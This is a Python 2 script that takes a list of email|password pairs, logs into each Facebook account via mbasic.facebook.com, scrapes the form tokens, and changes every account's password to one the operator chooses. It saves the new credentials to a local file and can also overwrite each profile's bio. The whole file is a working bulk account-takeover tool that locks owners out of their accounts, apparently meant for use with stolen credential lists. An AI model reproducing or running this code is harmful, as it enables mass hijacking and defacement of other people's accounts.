import os
import re
import sys
import bs4
import requests
import mechanize
from data.color import *
from data import cache
from multiprocessing.pool import ThreadPool

_bio=""
_out=""

if (os.path.exists("out")):
	if os.path.exists("out/newpassword.txt"):
		if os.path.getsize("out/newpassword.txt") !=0:
			_out=open("out/newpassword.txt","a")
		else:
			_out=open("out/newpassword.txt","w")
	else:
		_out=open("out/newpassword.txt","w")
else:
	os.mkdir("out")
	_out=open("out/newpassword.txt","w")
	
class risetPass():
	def __init__(self):
		self._req=requests.Session()
		self.submit=""
		self.i="https://mbasic.facebook.com/{}"
		self.inputakun()
		
	def inputakun(self):
		try:
			self.f=open(raw_input(
			"[%s*%s] Sparate: |\n[%s+%s] Akun List: "
			%(R,N,G,N))).read().splitlines()
			self.newpas=raw_input(
			"[%s*%s] New Password: "%(G,N))
			if (len(self.newpas) > 6):
				self.bio()
			else:sys.exit("[%s!%s] Password must contain at least 6 characters."%(R,N))
		except Exception as _err:
			print "%s[!]%s %s"%(R,N,_err)
		
	def bio(self):
		global _bio
		self.b=raw_input("[%s?%s] Change Bio? y/n? "%(R,N))
		if self.b.lower() == "y":
			_bio=raw_input("[%s+%s] New Bio Message: "%(G,N))
			if _bio == "":
				sys.exit("%s[!]%s bio empty!"%(R,N))
			self.cek()
		elif self.b == "":
			return self.bio()
		else:
			_bio=self.b.lower()
			self.cek()
			
	def cek(self):
		global _out
		for i in self.f:
			t=ThreadPool(5)
			t.map(self.logs,[(i)])
		_out.close()
			
	def logs(self,i):
			self.akun=i.split("|")
			print "\n[%s*%s] Login: %s|%s"%(G,N,
			self.akun[0],self.akun[1])
			b=bs4.BeautifulSoup(
			self._req.get(self.i.format("login")).text,
			features="html.parser")
			for x in b("input"):
				if "login" in x["name"]:
					self.submit=x["value"]
					self.log(self.akun[0],self.akun[1])
					break
				
	def log(self,imel,pw):
		req= self._req.post(self.i.format("login"),data={
			"email":imel,
			"pass":pw,
			"login":self.submit}).url
		if "save-device" in req or "m_sess" in req:
			print "[%s+%s] Login Ok"%(G,N)
			self.lok("settings/security/password/")
		else:
			print "%s[!]%s Failed Login"%(R,N)
			self._req.cookies.clear()
			
	def lok(self,url):
		global _bio,_out
		bs=bs4.BeautifulSoup(
			self._req.get(self.i.format(url)).text,
		features="html.parser")
		
		for x in bs("form"):
			if "/password/change" in x["action"]:
				self.action=x["action"]
			
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					self.dtsg=x["value"]
				if "jazoest" in x["name"]:
					self.jazoes=x["value"]
				if "save" in x["name"]:
					self.save=x["value"]
					break
			except:pass
		
		oks=self._req.post(
		self.i.format(self.action),data=
		{
				"fb_dtsg":self.dtsg,
				"jazoest":self.jazoes,
				"password_old":self.akun[1],
				"password_new":self.newpas,
				"password_confirm":self.newpas,
				"save":self.save}

		).url
		
		if "password_reply_value" in oks:
			print "%s[!]%s password similar to the old one"%(R,N)
			self._req.cookies.clear()
		if "pw_change" in oks:
			print "[%s+%s] Password Successfully Changed!: %s%s%s\n[%s+%s] output: out/newpassword.txt"%(G,N,G,
			self.newpas,N,G,N)
			_out.write("%s|%s\n"%(
				self.akun[0],
					self.newpas))
			if self.b !="y":
				self._req.cookies.clear()
			else:
				print "[%s+%s] Change bio ..."%(G,N)
				br=mechanize.Browser()
				br.set_handle_equiv(True)
				br.set_handle_redirect(True)
				br.set_handle_robots(False)
				br.open(self.i.format("login"))
				br._factory.is_html=True
				br.select_form(nr=0)
				br.form["email"] = "%s"%(self.akun[0])
				br.form["pass"] = "%s"%(self.newpas)
				br.submit()
				br.open(
				self.i.format('profile/basic/intro/bio/'))
				br._factory.is_html=True
				br.select_form(nr=1)
				br.form["bio"] = "%s"%(_bio)
				br.submit()
				br.close()
				self._req.cookies.clear()
				print "%s[!]%s Bio Successfully changed!"%(G,N)
		else:
			print "%s[!]%s Failed To Change Password!"%(R,N)
			self._req.cookies.clear()
